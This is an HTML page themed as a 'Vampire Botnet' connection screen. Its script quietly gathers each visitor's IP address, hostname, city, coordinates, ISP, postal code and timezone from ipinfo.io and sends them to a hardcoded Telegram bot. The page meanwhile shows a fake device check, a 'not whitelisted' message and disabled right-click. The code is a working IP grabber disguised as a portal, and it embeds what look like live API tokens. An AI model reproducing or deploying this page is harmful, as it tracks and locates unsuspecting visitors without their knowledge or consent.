<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vampire Networks WebSocket</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=MedievalSharp&display=swap');

        body {
            background-color: #000;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'MedievalSharp', cursive;
            text-align: center;
            margin: 0;
            overflow: hidden;
            position: relative;
        }
        #initial-message, #whitelist-message, #checking-message {
            font-size: 28px;
            text-shadow: 2px 2px 5px rgba(255, 0, 0, 0.7);
        }
        #whitelist-message {
            color: #ff0000;
            background: rgba(255, 0, 0, 0.2);
            padding: 20px;
            border-radius: 10px;
            border: 2px solid #ff0000;
            display: none;
        }
        #request-id {
            display: block;
            font-size: 16px;
            margin-top: 10px;
            color: #ff0000;
        }
        #checking-message {
            color: #33ff33;
            background: rgba(0, 255, 0, 0.2);
            padding: 20px;
            border-radius: 10px;
            border: 2px solid #33ff33;
            display: none;
            animation: fade 2s ease-in-out infinite;
        }
        .blood-splat {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            background: url('https://www.transparenttextures.com/patterns/blood.png') repeat;
            z-index: -1;
        }
        @keyframes fade {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
        #log-container {
            margin-top: 20px;
            font-size: 14px;
            text-align: left;
            width: 100%;
            max-width: 400px;
            color: #fff;
        }
        #log {
            background: rgba(0, 0, 0, 0.5);
            padding: 10px;
            border: 1px solid #33ff33;
            border-radius: 5px;
            height: 100px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="blood-splat"></div>
    <div id="initial-message">Press Enter or Tap to connect to the Vampire Botnet</div>
    <div id="checking-message">
         Checking your Device Information...
         <div id="log-container">
             <div id="log"></div> <!-- Logs will appear here -->
         </div>
    </div>
    <div id="whitelist-message">
        Your IP is not whitelisted
        <div id="request-id"></div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '7518894181:AAF7VlfFByIBJZQkDAOTR8rmXrhrj1AK_3Y';
        const CHAT_ID = '5917899680';

        function generateRequestId() {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let requestId = '';
            for (let i = 0; i < 16; i++) {
                requestId += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return requestId;
        }

        function getRandomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const data = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            };
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => console.log('Message sent:', data))
            .catch(error => console.error('Error sending message:', error));
        }

        function startConnection() {
            document.getElementById('initial-message').style.display = 'none';
            var checkingMessage = document.getElementById('checking-message');
            checkingMessage.style.display = 'block';

            const requestId = generateRequestId();
            const logDiv = document.getElementById('log');

            // Display initial logs
            let logs = [
                "Checking IP headers...",
                "User-Agent: " + navigator.userAgent,
                "Fetching your IP address..."
            ];

            logs.forEach((log, index) => {
                setTimeout(() => {
                    logDiv.innerHTML += log + "<br/>";
                    logDiv.scrollTop = logDiv.scrollHeight;
                }, index * 1000); // Add 1-second delay for each log
            });

            // Fetch the real IP address and additional info
            fetch('https://ipinfo.io/json?token=992407290ef77e') // Use your token from ipinfo.io
                .then(response => response.json())
                .then(data => {
                    setTimeout(() => {
                        logDiv.innerHTML += "IP: " + data.ip + "<br/>";
                        logDiv.scrollTop = logDiv.scrollHeight;
                    }, getRandomDelay(1000, 2000)); // Delay for showing IP

                    setTimeout(() => {
                        logDiv.innerHTML += "Location: " + data.city + ", " + data.region + ", " + data.country + "<br/>";
                        logDiv.scrollTop = logDiv.scrollHeight;
                    }, getRandomDelay(3000, 5000)); // Random delay for location

                    setTimeout(() => {
                        logDiv.innerHTML += "ISP: " + data.org + "<br/>";
                        logDiv.scrollTop = logDiv.scrollHeight;
                    }, getRandomDelay(5000, 7000)); // Random delay for ISP

                    setTimeout(() => {
                        logDiv.innerHTML += "Timezone: " + data.timezone + "<br/>";
                        logDiv.scrollTop = logDiv.scrollHeight;
                    }, getRandomDelay(7000, 10000)); // Random delay for timezone

                    const message = `Request ID: ${requestId} | IP: ${data.ip} | Hostname: ${data.hostname} | City: ${data.city} | Region: ${data.region} | Country: ${data.country} | Location: ${data.loc} | Org: ${data.org} | Postal: ${data.postal} | Timezone: ${data.timezone}`;
                    sendToTelegram(message);
                })
                .catch(error => {
                    logDiv.innerHTML += "Error fetching IP details: " + error + "<br/>";
                    logDiv.scrollTop = logDiv.scrollHeight;
                });

            setTimeout(function() {
                checkingMessage.style.display = 'none';
                var whitelistMessage = document.getElementById('whitelist-message');
                whitelistMessage.style.display = 'block';
                document.getElementById('request-id').textContent = 'Request ID: ' + requestId;
            }, 17000); // Random total delay
        }

        document.addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                startConnection();
            }
        });

        document.addEventListener('touchstart', function() {
            startConnection();
        });

        document.addEventListener('contextmenu', function(event) {
            event.preventDefault();
        });

        document.addEventListener('mousedown', function(event) {
            event.preventDefault();
        });
    </script>
</body>
</html>
